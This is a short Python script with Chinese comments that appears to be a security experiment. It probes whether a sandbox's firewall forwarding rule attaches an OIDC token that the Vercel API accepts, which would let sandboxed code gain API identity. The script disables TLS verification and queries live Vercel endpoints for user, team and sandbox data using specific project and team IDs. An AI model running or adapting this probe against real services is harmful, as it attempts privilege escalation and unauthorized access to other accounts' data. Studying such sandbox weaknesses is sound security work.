# 实验G1: OIDC token aud=api.vercel.com 是否被 Vercel API 接受
# policy: custom + allowedDomains=[httpbin.org, api.vercel.com]
# update: allow.api.vercel.com -> [{match:{path:{exact:"/v2"}}, forwardURL:"https://api.vercel.com"}]
# 沙箱请求 https://api.vercel.com/v2/... -> 匹配 -> 防火墙转发 + 附加 aud=api.vercel.com 的 OIDC token
# 如果 API 接受 token -> 沙箱内代码获得 API 身份(提权)
import urllib.request, ssl, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def fetch(path_qs):
    url = f"https://api.vercel.com{path_qs}"
    req = urllib.request.Request(url)
    try:
        r = urllib.request.urlopen(req, context=ctx, timeout=30)
        body = r.read(3000)
        print(f"== {path_qs[:60]} -> STATUS {r.status}")
        print("   BODY:", body[:1200])
    except urllib.error.HTTPError as e:
        body = e.read(3000)
        print(f"== {path_qs[:60]} -> HTTPError {e.code}")
        print("   BODY:", body[:1200])
    except Exception as e:
        print(f"== {path_qs[:60]} -> EXC {type(e).__name__}: {e}")

# 1. 列表沙箱(需要 team+project)
fetch("/v2/sandboxes?project=prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F&teamId=team_GIy1SZ444lspqeNbh4r8uAUg")
# 2. 用户信息
fetch("/v2/user")
# 3. team 信息
fetch("/v2/teams/team_GIy1SZ444lspqeNbh4r8uAUg")
